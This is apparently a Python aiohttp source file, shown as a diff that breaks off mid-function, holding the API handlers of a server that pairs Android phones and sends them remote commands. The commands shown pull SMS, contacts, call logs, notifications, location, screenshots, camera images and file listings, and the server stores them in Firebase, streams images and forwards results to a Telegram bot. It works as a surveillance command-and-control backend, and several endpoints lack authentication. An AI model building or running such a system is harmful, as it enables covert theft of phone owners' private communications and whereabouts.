@@ -1,0 +1,1125 @@
+     1→     1→"""
+     2→     2→API Handlers - All HTTP/WebSocket request handlers for the Abu-Zahra Server.
+     3→     3→Architecture: Client → Server ← {Web Dashboard, Admin App, Telegram Bot}
+     4→     4→"""
+     5→     5→
+     6→     6→import json
+     7→     7→import time
+     8→     8→import base64
+     9→     9→import asyncio
+    10→    10→import logging
+    11→    11→from aiohttp import web, WSMsgType
+    12→    12→from datetime import datetime
+    13→    13→
+    14→    14→from .config import (
+    15→    15→    CORS_ORIGINS, VERSION, SERVER_DOMAIN, SERVER_URL,
+    16→    16→    MAX_UPLOAD_SIZE, JPEG_STREAM_INTERVAL, STREAM_FRAME_CACHE_SIZE
+    17→    17→)
+    18→    18→from .store import store
+    19→    19→from .commands import COMMAND_REGISTRY, CMD_CATEGORIES, get_all_categories
+    20→    20→from .firebase_client import (
+    21→    21→    firebase_connected, push_command, store_sms, store_contacts,
+    22→    22→    store_calls, store_notifications, store_device_info, store_location
+    23→    23→)
+    24→    24→from .file_storage import save_upload, save_base64_upload, get_file, get_storage_stats
+    25→    25→from .telegram_bot import forward_result
+    26→    26→
+    27→    27→logger = logging.getLogger("api")
+    28→    28→
+    29→    29→
+    30→    30→# ─── Middleware ────────────────────────────────────────────────
+    31→    31→
+    32→    32→@web.middleware
+    33→    33→async def cors_middleware(request: web.Request, handler):
+    34→    34→    if request.method == 'OPTIONS':
+    35→    35→        resp = web.Response(status=204)
+    36→    36→    else:
+    37→    37→        resp = await handler(request)
+    38→    38→    
+    39→    39→    origin = request.headers.get('Origin', '')
+    40→    40→    if origin in CORS_ORIGINS or origin == '':
+    41→    41→        resp.headers['Access-Control-Allow-Origin'] = origin or CORS_ORIGINS[0]
+    42→    42→    resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
+    43→    43→    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Device-Token'
+    44→    44→    resp.headers['Access-Control-Max-Age'] = '86400'
+    45→    45→    return resp
+    46→    46→
+    47→    47→
+    48→    48→def get_auth_session(request: web.Request):
+    49→    49→    """Extract and validate session from Authorization header."""
+    50→    50→    auth = request.headers.get('Authorization', '')
+    51→    51→    if not auth.startswith('Bearer '):
+    52→    52→        return None
+    53→    53→    token = auth[7:]
+    54→    54→    return store.validate_session(token)
+    55→    55→
+    56→    56→
+    57→    57→def get_device_auth(request: web.Request):
+    58→    58→    """Extract device_id and validate device token."""
+    59→    59→    device_id = request.match_info.get('device_id') or request.query.get('device_id', '')
+    60→    60→    token = request.headers.get('X-Device-Token', '')
+    61→    61→    if not device_id or not token:
+    62→    62→        return None, "Missing device_id or token"
+    63→    63→    if not store.validate_device_token(device_id, token):
+    64→    64→        return None, "Invalid device token"
+    65→    65→    return device_id, None
+    66→    66→
+    67→    67→
+    68→    68→def json_response(data: any, status: int = 200) -> web.Response:
+    69→    69→    return web.Response(
+    70→    70→        text=json.dumps(data, ensure_ascii=False, default=str),
+    71→    71→        content_type='application/json',
+    72→    72→        status=status
+    73→    73→    )
+    74→    74→
+    75→    75→
+    76→    76→# ─── Public Endpoints ─────────────────────────────────────────
+    77→    77→
+    78→    78→async def api_health(request: web.Request) -> web.Response:
+    79→    79→    store.api_hits += 1
+    80→    80→    return json_response({
+    81→    81→        "ok": True,
+    82→    82→        "status": "running",
+    83→    83→        "version": VERSION,
+    84→    84→        "firebase": firebase_connected,
+    85→    85→        "uptime": int(time.time() - store.start_time),
+    86→    86→        "devices": len(store.devices),
+    87→    87→        "commands": len(store.commands),
+    88→    88→    })
+    89→    89→
+    90→    90→
+    91→    91→async def api_login(request: web.Request) -> web.Response:
+    92→    92→    """Web/Admin login. Accepts username/email + password."""
+    93→    93→    store.api_hits += 1
+    94→    94→    try:
+    95→    95→        body = await request.json()
+    96→    96→    except:
+    97→    97→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+    98→    98→    
+    99→    99→    username_or_email = body.get('username', '').strip()
+   100→   100→    password = body.get('password', '')
+   101→   101→    
+   102→   102→    if not username_or_email or not password:
+   103→   103→        return json_response({"ok": False, "message": "Missing username or password"}, 400)
+   104→   104→    
+   105→   105→    user = await store.authenticate_user(username_or_email, password)
+   106→   106→    if not user:
+   107→   107→        return json_response({"ok": False, "message": "اسم المستخدم أو كلمة المرور غير صحيحة"}, 401)
+   108→   108→    
+   109→   109→    # Create session
+   110→   110→    ip = request.remote or ""
+   111→   111→    ua = request.headers.get('User-Agent', '')
+   112→   112→    session = store.create_session(user['id'], user['username'], user['role'], ip, ua, source="web")
+   113→   113→    
+   114→   114→    await store.add_event("auth", f"User logged in: {user['username']} (web)", "success", user_id=user['id'])
+   115→   115→    
+   116→   116→    return json_response({
+   117→   117→        "ok": True,
+   118→   118→        "success": True,
+   119→   119→        "token": session['token'],
+   120→   120→        "expires_at": session['expires_at'],
+   121→   121→        "user_id": user['id'],
+   122→   122→        "username": user['username'],
+   123→   123→        "role": user['role'],
+   124→   124→        "email": user['email'],
+   125→   125→        "message": "تم تسجيل الدخول بنجاح"
+   126→   126→    })
+   127→   127→
+   128→   128→
+   129→   129→# ─── Device API (authenticated by device token) ───────────────
+   130→   130→
+   131→   131→async def api_register(request: web.Request) -> web.Response:
+   132→   132→    """Device registration using pairing code."""
+   133→   133→    store.api_hits += 1
+   134→   134→    try:
+   135→   135→        body = await request.json()
+   136→   136→    except:
+   137→   137→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   138→   138→    
+   139→   139→    device_id = body.get('device_id', '')
+   140→   140→    link_code = body.get('link_code', '')
+   141→   141→    device_token = body.get('device_token', '') or body.get('token', '')
+   142→   142→    model = body.get('device_model', '') or body.get('model', '')
+   143→   143→    brand = body.get('brand', '')
+   144→   144→    os_version = body.get('os_version', '') or body.get('android', '')
+   145→   145→    
+   146→   146→    if not device_id or not link_code:
+   147→   147→        return json_response({"ok": False, "message": "Missing device_id or link_code"}, 400)
+   148→   148→    
+   149→   149→    # Verify pairing code
+   150→   150→    code_data = await store.verify_pairing_code(link_code)
+   151→   151→    if not code_data:
+   152→   152→        return json_response({"ok": False, "message": "كود الربط غير صالح أو منتهي الصلاحية"}, 400)
+   153→   153→    
+   154→   154→    # Register device
+   155→   155→    device = await store.register_device(
+   156→   156→        device_id=device_id,
+   157→   157→        token=device_token,
+   158→   158→        pairing_code=link_code,
+   159→   159→        model=model,
+   160→   160→        brand=brand,
+   161→   161→        os_version=os_version,
+   162→   162→        user_id=code_data.get('user_id'),
+   163→   163→    )
+   164→   164→    
+   165→   165→    if not device:
+   166→   166→        return json_response({"ok": False, "message": "فشل تسجيل الجهاز"}, 500)
+   167→   167→    
+   168→   168→    return json_response({
+   169→   169→        "ok": True,
+   170→   170→        "success": True,
+   171→   171→        "device_id": device_id,
+   172→   172→        "device_token": device_token,
+   173→   173→        "server_domain": SERVER_DOMAIN,
+   174→   174→        "message": "تم تسجيل الجهاز بنجاح"
+   175→   175→    })
+   176→   176→
+   177→   177→
+   178→   178→async def api_get_commands(request: web.Request) -> web.Response:
+   179→   179→    """Device fetches pending commands."""
+   180→   180→    device_id, error = get_device_auth(request)
+   181→   181→    if error:
+   182→   182→        return json_response({"ok": False, "message": error}, 401)
+   183→   183→    
+   184→   184→    commands = await store.get_pending_commands(device_id)
+   185→   185→    
+   186→   186→    # Mark as sent
+   187→   187→    for cmd in commands:
+   188→   188→        cmd['sent_at'] = datetime.utcnow().isoformat()
+   189→   189→    
+   190→   190→    return json_response({
+   191→   191→        "ok": True,
+   192→   192→        "commands": commands,
+   193→   193→        "count": len(commands),
+   194→   194→        "server_time": datetime.utcnow().isoformat(),
+   195→   195→    })
+   196→   196→
+   197→   197→
+   198→   198→async def api_command_result(request: web.Request) -> web.Response:
+   199→   199→    """Device submits command result."""
+   200→   200→    store.api_hits += 1
+   201→   201→    command_id = request.match_info.get('command_id', '')
+   202→   202→    device_id, error = get_device_auth(request)
+   203→   203→    if error:
+   204→   204→        return json_response({"ok": False, "message": error}, 401)
+   205→   205→    
+   206→   206→    try:
+   207→   207→        body = await request.json()
+   208→   208→    except:
+   209→   209→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   210→   210→    
+   211→   211→    status = body.get('status', 'completed')
+   212→   212→    result = body.get('result', '')
+   213→   213→    
+   214→   214→    updated = await store.update_command_result(command_id, status, result)
+   215→   215→    
+   216→   216→    # Forward result to Telegram if pending
+   217→   217→    if updated and command_id in store.pending_messages:
+   218→   218→        await forward_result(command_id, result)
+   219→   219→    
+   220→   220→    # Store text data in Firebase
+   221→   221→    if updated and isinstance(result, str) and len(result) < 50000:
+   222→   222→        cmd = store.commands.get(command_id, {})
+   223→   223→        cmd_name = cmd.get('command', '')
+   224→   224→        
+   225→   225→        if cmd_name in ('get_sms',):
+   226→   226→            await store_sms(device_id, json.loads(result) if result.startswith('[') else result)
+   227→   227→        elif cmd_name in ('get_contacts',):
+   228→   228→            await store_contacts(device_id, json.loads(result) if result.startswith('[') else result)
+   229→   229→        elif cmd_name in ('get_calls',):
+   230→   230→            await store_calls(device_id, json.loads(result) if result.startswith('[') else result)
+   231→   231→        elif cmd_name in ('get_notifications',):
+   232→   232→            await store_notifications(device_id, json.loads(result) if result.startswith('[') else result)
+   233→   233→        elif cmd_name in ('get_location',):
+   234→   234→            await store_location(device_id, json.loads(result) if result.startswith('{') else result)
+   235→   235→        elif cmd_name in ('get_info', 'get_battery', 'get_wifi_info', 'get_network_info',
+   236→   236→                          'get_sim_info', 'get_storage_info'):
+   237→   237→            await store_device_info(device_id, json.loads(result) if result.startswith('{') else {"raw": result})
+   238→   238→    
+   239→   239→    # Handle base64 image results - save as temp file
+   240→   240→    if updated and isinstance(result, str) and len(result) > 10000 and result.startswith('/9j/'):
+   241→   241→        try:
+   242→   242→            img_bytes = base64.b64decode(result)
+   243→   243→            await save_upload(device_id, img_bytes, f"screenshot_{command_id}.jpg",
+   244→   244→                            file_type="screenshot", command_id=command_id)
+   245→   245→            # Cache for streaming
+   246→   246→            store.latest_frames[f"{device_id}:video"] = {
+   247→   247→                "data": result,
+   248→   248→                "timestamp": time.time(),
+   249→   249→                "source": "screenshot",
+   250→   250→            }
+   251→   251→        except Exception as e:
+   252→   252→            logger.error(f"Failed to save screenshot: {e}")
+   253→   253→    
+   254→   254→    return json_response({"ok": True, "success": True, "message": "Result received"})
+   255→   255→
+   256→   256→
+   257→   257→async def api_device_data(request: web.Request) -> web.Response:
+   258→   258→    """Device sends typed data (location, battery, events, etc.)."""
+   259→   259→    device_id, error = get_device_auth(request)
+   260→   260→    if error:
+   261→   261→        return json_response({"ok": False, "message": error}, 401)
+   262→   262→    
+   263→   263→    try:
+   264→   264→        body = await request.json()
+   265→   265→    except:
+   266→   266→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   267→   267→    
+   268→   268→    data_type = body.get('type', '')
+   269→   269→    data = body.get('data', {})
+   270→   270→    command = body.get('command', '')
+   271→   271→    
+   272→   272→    # Store in Firebase for text data
+   273→   273→    if data_type == 'location' and data:
+   274→   274→        await store_location(device_id, data)
+   275→   275→    elif data_type == 'sms' and data:
+   276→   276→        await store_sms(device_id, data if isinstance(data, list) else [data])
+   277→   277→    elif data_type == 'contacts' and data:
+   278→   278→        await store_contacts(device_id, data if isinstance(data, list) else [data])
+   279→   279→    elif data_type == 'calls' and data:
+   280→   280→        await store_calls(device_id, data if isinstance(data, list) else [data])
+   281→   281→    elif data_type == 'notifications' and data:
+   282→   282→        await store_notifications(device_id, data if isinstance(data, list) else [data])
+   283→   283→    elif data_type == 'device_info' and data:
+   284→   284→        await store_device_info(device_id, data)
+   285→   285→    
+   286→   286→    # Update device info
+   287→   287→    if data_type == 'location' and isinstance(data, dict):
+   288→   288→        await store.update_device(device_id, {"location": data})
+   289→   289→    elif data_type == 'battery' and isinstance(data, (int, float)):
+   290→   290→        await store.update_device(device_id, {"battery": data})
+   291→   291→    
+   292→   292→    return json_response({"ok": True, "success": True, "message": "Data stored"})
+   293→   293→
+   294→   294→
+   295→   295→async def api_heartbeat(request: web.Request) -> web.Response:
+   296→   296→    """Device heartbeat."""
+   297→   297→    store.api_hits += 1
+   298→   298→    try:
+   299→   299→        body = await request.json()
+   300→   300→    except:
+   301→   301→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   302→   302→    
+   303→   303→    device_id = body.get('device_id', '')
+   304→   304→    status = body.get('status', 'online')
+   305→   305→    battery = body.get('battery')
+   306→   306→    
+   307→   307→    if not device_id:
+   308→   308→        return json_response({"ok": False, "message": "Missing device_id"}, 400)
+   309→   309→    
+   310→   310→    await store.update_heartbeat(device_id, status, battery)
+   311→   311→    
+   312→   312→    return json_response({"ok": True, "success": True, "message": "Heartbeat received"})
+   313→   313→
+   314→   314→
+   315→   315→async def api_device_event(request: web.Request) -> web.Response:
+   316→   316→    """Device sends events."""
+   317→   317→    device_id, error = get_device_auth(request)
+   318→   318→    if error:
+   319→   319→        return json_response({"ok": False, "message": error}, 401)
+   320→   320→    
+   321→   321→    try:
+   322→   322→        body = await request.json()
+   323→   323→    except:
+   324→   324→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   325→   325→    
+   326→   326→    event_type = body.get('event_type', '')
+   327→   327→    data = body.get('data', {})
+   328→   328→    
+   329→   329→    await store.add_event("device", str(data)[:200], "info", device_id=device_id, details=event_type)
+   330→   330→    
+   331→   331→    return json_response({"ok": True, "stored": True})
+   332→   332→
+   333→   333→
+   334→   334→async def api_upload_file(request: web.Request) -> web.Response:
+   335→   335→    """Multipart file upload."""
+   336→   336→    store.api_hits += 1
+   337→   337→    
+   338→   338→    # Get device_id from form or IP map
+   339→   339→    device_id = None
+   340→   340→    token = request.headers.get('X-Device-Token', '')
+   341→   341→    
+   342→   342→    try:
+   343→   343→        reader = await request.multipart()
+   344→   344→        fields = {}
+   345→   345→        file_data = None
+   346→   346→        filename = ""
+   347→   347→        
+   348→   348→        async for field in reader:
+   349→   349→            if field.name == 'file':
+   350→   350→                file_data = await field.read(decode=False)
+   351→   351→                filename = field.filename or "unknown"
+   352→   352→            else:
+   353→   353→                fields[field.name] = (await field.read(decode=True)).decode('utf-8', errors='replace')
+   354→   354→        
+   355→   355→        device_id = fields.get('device_id', '')
+   356→   356→        if not device_id:
+   357→   357→            device_id = store._ip_device_map.get(request.remote, '')
+   358→   358→        
+   359→   359→        if not device_id:
+   360→   360→            return json_response({"ok": False, "message": "Unknown device"}, 400)
+   361→   361→        
+   362→   362→        file_type = fields.get('file_type', 'file')
+   363→   363→        command_id = fields.get('command_id', '')
+   364→   364→        caption = fields.get('caption', '')
+   365→   365→        
+   366→   366→        if not file_data:
+   367→   367→            return json_response({"ok": False, "message": "No file data"}, 400)
+   368→   368→        
+   369→   369→        if len(file_data) > MAX_UPLOAD_SIZE:
+   370→   370→            return json_response({"ok": False, "message": "File too large"}, 413)
+   371→   371→        
+   372→   372→        file_meta = await save_upload(device_id, file_data, filename, file_type, command_id, caption)
+   373→   373→        
+   374→   374→        return json_response({
+   375→   375→            "ok": True,
+   376→   376→            "file_id": file_meta['id'],
+   377→   377→            "file_name": filename,
+   378→   378→            "file_size": len(file_data),
+   379→   379→        })
+   380→   380→    except Exception as e:
+   381→   381→        logger.error(f"Upload error: {e}")
+   382→   382→        return json_response({"ok": False, "message": str(e)}, 500)
+   383→   383→
+   384→   384→
+   385→   385→async def api_upload_base64(request: web.Request) -> web.Response:
+   386→   386→    """Base64 file upload."""
+   387→   387→    store.api_hits += 1
+   388→   388→    device_id, error = get_device_auth(request)
+   389→   389→    if error:
+   390→   390→        return json_response({"ok": False, "message": error}, 401)
+   391→   391→    
+   392→   392→    try:
+   393→   393→        body = await request.json()
+   394→   394→    except:
+   395→   395→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   396→   396→    
+   397→   397→    base64_data = body.get('base64_data', '')
+   398→   398→    filename = body.get('filename', 'upload.jpg')
+   399→   399→    file_type = body.get('file_type', 'file')
+   400→   400→    command_id = body.get('command_id', '')
+   401→   401→    caption = body.get('caption', '')
+   402→   402→    
+   403→   403→    if not base64_data:
+   404→   404→        return json_response({"ok": False, "message": "No base64 data"}, 400)
+   405→   405→    
+   406→   406→    try:
+   407→   407→        file_meta = await save_base64_upload(device_id, base64_data, filename, file_type, command_id, caption)
+   408→   408→        
+   409→   409→        # Cache images for streaming viewer
+   410→   410→        if file_type in ('photo', 'screenshot', 'camera') and base64_data.startswith('/9j/'):
+   411→   411→            store.latest_frames[f"{device_id}:video"] = {
+   412→   412→                "data": base64_data,
+   413→   413→                "timestamp": time.time(),
+   414→   414→                "source": file_type,
+   415→   415→            }
+   416→   416→        
+   417→   417→        return json_response({
+   418→   418→            "ok": True,
+   419→   419→            "file_id": file_meta['id'],
+   420→   420→            "file_name": filename,
+   421→   421→        })
+   422→   422→    except ValueError as e:
+   423→   423→        return json_response({"ok": False, "message": str(e)}, 400)
+   424→   424→    except Exception as e:
+   425→   425→        return json_response({"ok": False, "message": str(e)}, 500)
+   426→   426→
+   427→   427→
+   428→   428→async def api_download_file(request: web.Request) -> web.Response:
+   429→   429→    """Download a file by file_id."""
+   430→   430→    file_id = request.match_info.get('file_id', '')
+   431→   431→    session = get_auth_session(request)
+   432→   432→    
+   433→   433→    if not session:
+   434→   434→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   435→   435→    
+   436→   436→    data, meta = await get_file(file_id)
+   437→   437→    if not data:
+   438→   438→        return json_response({"ok": False, "message": "File not found or expired"}, 404)
+   439→   439→    
+   440→   440→    content_type = {
+   441→   441→        'photo': 'image/jpeg', 'screenshot': 'image/jpeg', 'camera': 'image/jpeg',
+   442→   442→        'video': 'video/mp4', 'audio': 'audio/mpeg', 'file': 'application/octet-stream'
+   443→   443→    }.get(meta.get('file_type', ''), 'application/octet-stream')
+   444→   444→    
+   445→   445→    return web.Response(
+   446→   446→        body=data,
+   447→   447→        content_type=content_type,
+   448→   448→        headers={
+   449→   449→            'Content-Disposition': f'attachment; filename="{meta["filename"]}"',
+   450→   450→            'Content-Length': str(len(data)),
+   451→   451→        }
+   452→   452→    )
+   453→   453→
+   454→   454→
+   455→   455→async def api_device_settings(request: web.Request) -> web.Response:
+   456→   456→    """Device fetches settings."""
+   457→   457→    device_id = request.match_info.get('device_id', '')
+   458→   458→    return json_response({
+   459→   459→        "ok": True,
+   460→   460→        "settings": {
+   461→   461→            "sync_interval": store.settings.get('sync_interval', 15),
+   462→   462→            "location_interval": store.settings.get('location_interval', 300),
+   463→   463→            "auto_location": store.settings.get('auto_location', False),
+   464→   464→            "auto_sync": store.settings.get('auto_sync', True),
+   465→   465→        }
+   466→   466→    })
+   467→   467→
+   468→   468→
+   469→   469→# ─── Authenticated Web/Admin API ──────────────────────────────
+   470→   470→
+   471→   471→async def api_web_devices(request: web.Request) -> web.Response:
+   472→   472→    session = get_auth_session(request)
+   473→   473→    if not session:
+   474→   474→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   475→   475→    
+   476→   476→    devices = await store.get_user_devices(session['user_id'])
+   477→   477→    # Add online status
+   478→   478→    result = []
+   479→   479→    for d in devices:
+   480→   480→        dev = dict(d)
+   481→   481→        dev['online'] = store._device_last_online.get(d['id'], False)
+   482→   482→        result.append(dev)
+   483→   483→    
+   484→   484→    return json_response({"ok": True, "devices": result})
+   485→   485→
+   486→   486→
+   487→   487→async def api_web_device_detail(request: web.Request) -> web.Response:
+   488→   488→    session = get_auth_session(request)
+   489→   489→    if not session:
+   490→   490→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   491→   491→    
+   492→   492→    device_id = request.match_info.get('device_id', '')
+   493→   493→    device = await store.get_user_device(session['user_id'], device_id)
+   494→   494→    if not device:
+   495→   495→        return json_response({"ok": False, "message": "Device not found"}, 404)
+   496→   496→    
+   497→   497→    dev = dict(device)
+   498→   498→    dev['online'] = store._device_last_online.get(device_id, False)
+   499→   499→    commands = await store.get_commands_history(device_id, limit=20)
+   500→   500→    
+   501→   501→    return json_response({"ok": True, "device": dev, "commands": commands})
+   502→   502→
+   503→   503→
+   504→   504→async def api_web_commands(request: web.Request) -> web.Response:
+   505→   505→    session = get_auth_session(request)
+   506→   506→    if not session:
+   507→   507→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   508→   508→    
+   509→   509→    commands = await store.get_commands_history(limit=100)
+   510→   510→    return json_response({"ok": True, "commands": commands})
+   511→   511→
+   512→   512→
+   513→   513→async def api_web_events(request: web.Request) -> web.Response:
+   514→   514→    session = get_auth_session(request)
+   515→   515→    if not session:
+   516→   516→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   517→   517→    
+   518→   518→    device_id = request.query.get('device_id', '')
+   519→   519→    event_type = request.query.get('type', '')
+   520→   520→    events = await store.get_events(device_id=device_id or None, event_type=event_type or None, limit=100)
+   521→   521→    return json_response({"ok": True, "events": events})
+   522→   522→
+   523→   523→
+   524→   524→async def api_web_stats(request: web.Request) -> web.Response:
+   525→   525→    session = get_auth_session(request)
+   526→   526→    if not session:
+   527→   527→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   528→   528→    
+   529→   529→    stats = store.get_stats()
+   530→   530→    stats['storage'] = get_storage_stats()
+   531→   531→    return json_response({"ok": True, "stats": stats})
+   532→   532→
+   533→   533→
+   534→   534→async def api_web_send_command(request: web.Request) -> web.Response:
+   535→   535→    session = get_auth_session(request)
+   536→   536→    if not session:
+   537→   537→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   538→   538→    
+   539→   539→    try:
+   540→   540→        body = await request.json()
+   541→   541→    except:
+   542→   542→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   543→   543→    
+   544→   544→    device_id = body.get('device_id', '')
+   545→   545→    command = body.get('command', '')
+   546→   546→    params = body.get('params', {})
+   547→   547→    
+   548→   548→    if not device_id or not command:
+   549→   549→        return json_response({"ok": False, "message": "Missing device_id or command"}, 400)
+   550→   550→    
+   551→   551→    # Check device ownership
+   552→   552→    device = await store.get_user_device(session['user_id'], device_id)
+   553→   553→    if not device:
+   554→   554→        return json_response({"ok": False, "message": "Device not found or access denied"}, 404)
+   555→   555→    
+   556→   556→    # Look up the actual command
+   557→   557→    cmd_def = COMMAND_REGISTRY.get(command, {})
+   558→   558→    actual_cmd = cmd_def.get('cmd', command)
+   559→   559→    actual_params = cmd_def.get('params', {})
+   560→   560→    if params:
+   561→   561→        actual_params.update(params)
+   562→   562→    
+   563→   563→    # Rate limit
+   564→   564→    if not store.check_rate_limit(f"cmd_{session['user_id']}", 20, 60):
+   565→   565→        return json_response({"ok": False, "message": "Rate limited"}, 429)
+   566→   566→    
+   567→   567→    # Queue command
+   568→   568→    queued = await store.queue_command(
+   569→   569→        device_id=device_id,
+   570→   570→        command=actual_cmd,
+   571→   571→        params=actual_params,
+   572→   572→        requested_by=session['user_id'],
+   573→   573→        source="web"
+   574→   574→    )
+   575→   575→    
+   576→   576→    # Push to Firebase
+   577→   577→    if firebase_connected:
+   578→   578→        await push_command(device_id, {
+   579→   579→            "id": queued['id'],
+   580→   580→            "command": actual_cmd,
+   581→   581→            "params": actual_params,
+   582→   582→            "created_at": queued['created_at'],
+   583→   583→        })
+   584→   584→    
+   585→   585→    await store.add_event("command", f"Command queued: {actual_cmd} -> {device_id}",
+   586→   586→                         "info", device_id=device_id, user_id=session['user_id'])
+   587→   587→    
+   588→   588→    return json_response({"ok": True, "command": queued})
+   589→   589→
+   590→   590→
+   591→   591→async def api_web_link_code(request: web.Request) -> web.Response:
+   592→   592→    session = get_auth_session(request)
+   593→   593→    if not session:
+   594→   594→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   595→   595→    
+   596→   596→    code_data = store.generate_pairing_code(session['user_id'])
+   597→   597→    return json_response({"ok": True, "code": code_data['code'], "session_id": code_data['session_id']})
+   598→   598→
+   599→   599→
+   600→   600→async def api_web_settings_get(request: web.Request) -> web.Response:
+   601→   601→    session = get_auth_session(request)
+   602→   602→    if not session:
+   603→   603→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   604→   604→    
+   605→   605→    return json_response({"ok": True, "settings": store.settings})
+   606→   606→
+   607→   607→
+   608→   608→async def api_web_settings_set(request: web.Request) -> web.Response:
+   609→   609→    session = get_auth_session(request)
+   610→   610→    if not session:
+   611→   611→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   612→   612→    
+   613→   613→    if session['role'] != 'admin':
+   614→   614→        return json_response({"ok": False, "message": "Admin only"}, 403)
+   615→   615→    
+   616→   616→    try:
+   617→   617→        body = await request.json()
+   618→   618→    except:
+   619→   619→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   620→   620→    
+   621→   621→    store.settings.update(body)
+   622→   622→    await _save_json("settings.json", store.settings)
+   623→   623→    
+   624→   624→    return json_response({"ok": True})
+   625→   625→
+   626→   626→
+   627→   627→async def api_web_unlink(request: web.Request) -> web.Response:
+   628→   628→    session = get_auth_session(request)
+   629→   629→    if not session:
+   630→   630→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   631→   631→    
+   632→   632→    device_id = request.match_info.get('device_id', '')
+   633→   633→    success = await store.unlink_device(device_id, session['user_id'])
+   634→   634→    
+   635→   635→    if success:
+   636→   636→        return json_response({"ok": True})
+   637→   637→    return json_response({"ok": False, "message": "Device not found"}, 404)
+   638→   638→
+   639→   639→
+   640→   640→async def api_web_logout(request: web.Request) -> web.Response:
+   641→   641→    session = get_auth_session(request)
+   642→   642→    if not session:
+   643→   643→        return json_response({"ok": False, "message": "Not logged in"}, 401)
+   644→   644→    
+   645→   645→    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+   646→   646→    if token in store.sessions:
+   647→   647→        del store.sessions[token]
+   648→   648→    
+   649→   649→    return json_response({"ok": True})
+   650→   650→
+   651→   651→
+   652→   652→async def _save_json(name, data):
+   653→   653→    from .store import _save_json as _sj
+   654→   654→    await _sj(name, data)
+   655→   655→
+   656→   656→
+   657→   657→# ─── User Management API (Admin) ──────────────────────────────
+   658→   658→
+   659→   659→async def api_web_users(request: web.Request) -> web.Response:
+   660→   660→    session = get_auth_session(request)
+   661→   661→    if not session or session['role'] != 'admin':
+   662→   662→        return json_response({"ok": False, "message": "Admin only"}, 403)
+   663→   663→    
+   664→   664→    users = await store.list_users()
+   665→   665→    # Remove password hashes from response
+   666→   666→    safe_users = []
+   667→   667→    for u in users:
+   668→   668→        safe = dict(u)
+   669→   669→        safe.pop('password_hash', None)
+   670→   670→        safe_users.append(safe)
+   671→   671→    
+   672→   672→    return json_response({"ok": True, "users": safe_users})
+   673→   673→
+   674→   674→
+   675→   675→async def api_web_create_user(request: web.Request) -> web.Response:
+   676→   676→    session = get_auth_session(request)
+   677→   677→    if not session or session['role'] != 'admin':
+   678→   678→        return json_response({"ok": False, "message": "Admin only"}, 403)
+   679→   679→    
+   680→   680→    try:
+   681→   681→        body = await request.json()
+   682→   682→    except:
+   683→   683→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   684→   684→    
+   685→   685→    email = body.get('email', '')
+   686→   686→    username = body.get('username', '')
+   687→   687→    password = body.get('password', '')
+   688→   688→    role = body.get('role', 'user')
+   689→   689→    
+   690→   690→    if not email or not username or not password:
+   691→   691→        return json_response({"ok": False, "message": "Missing required fields"}, 400)
+   692→   692→    
+   693→   693→    try:
+   694→   694→        user = await store.create_user(email, username, password, role)
+   695→   695→        safe = dict(user)
+   696→   696→        safe.pop('password_hash', None)
+   697→   697→        return json_response({"ok": True, "user": safe})
+   698→   698→    except ValueError as e:
+   699→   699→        return json_response({"ok": False, "message": str(e)}, 400)
+   700→   700→
+   701→   701→
+   702→   702→async def api_web_delete_user(request: web.Request) -> web.Response:
+   703→   703→    session = get_auth_session(request)
+   704→   704→    if not session or session['role'] != 'admin':
+   705→   705→        return json_response({"ok": False, "message": "Admin only"}, 403)
+   706→   706→    
+   707→   707→    user_id = request.match_info.get('user_id', '')
+   708→   708→    if user_id == session['user_id']:
+   709→   709→        return json_response({"ok": False, "message": "Cannot delete yourself"}, 400)
+   710→   710→    
+   711→   711→    success = await store.delete_user(user_id)
+   712→   712→    if success:
+   713→   713→        return json_response({"ok": True})
+   714→   714→    return json_response({"ok": False, "message": "User not found"}, 404)
+   715→   715→
+   716→   716→
+   717→   717→# ─── File Management API ──────────────────────────────────────
+   718→   718→
+   719→   719→async def api_web_files(request: web.Request) -> web.Response:
+   720→   720→    session = get_auth_session(request)
+   721→   721→    if not session:
+   722→   722→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   723→   723→    
+   724→   724→    device_id = request.query.get('device_id', '')
+   725→   725→    
+   726→   726→    # List active files for the user's devices
+   727→   727→    files = []
+   728→   728→    for fid, fmeta in store.files.items():
+   729→   729→        if device_id and fmeta.get('device_id') != device_id:
+   730→   730→            continue
+   731→   731→        # Check ownership
+   732→   732→        device = store.devices.get(fmeta.get('device_id', ''))
+   733→   733→        if device and (session['role'] == 'admin' or device.get('owner_id') == session['user_id']):
+   734→   734→            safe = dict(fmeta)
+   735→   735→            safe.pop('path', None)
+   736→   736→            files.append(safe)
+   737→   737→    
+   738→   738→    return json_response({"ok": True, "files": files})
+   739→   739→
+   740→   740→
+   741→   741→async def api_web_list_files_device(request: web.Request) -> web.Response:
+   742→   742→    """Send list_files command to device and return result."""
+   743→   743→    session = get_auth_session(request)
+   744→   744→    if not session:
+   745→   745→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   746→   746→    
+   747→   747→    device_id = request.query.get('device_id', '')
+   748→   748→    path = request.query.get('path', '/storage/emulated/0/')
+   749→   749→    
+   750→   750→    if not device_id:
+   751→   751→        return json_response({"ok": False, "message": "Missing device_id"}, 400)
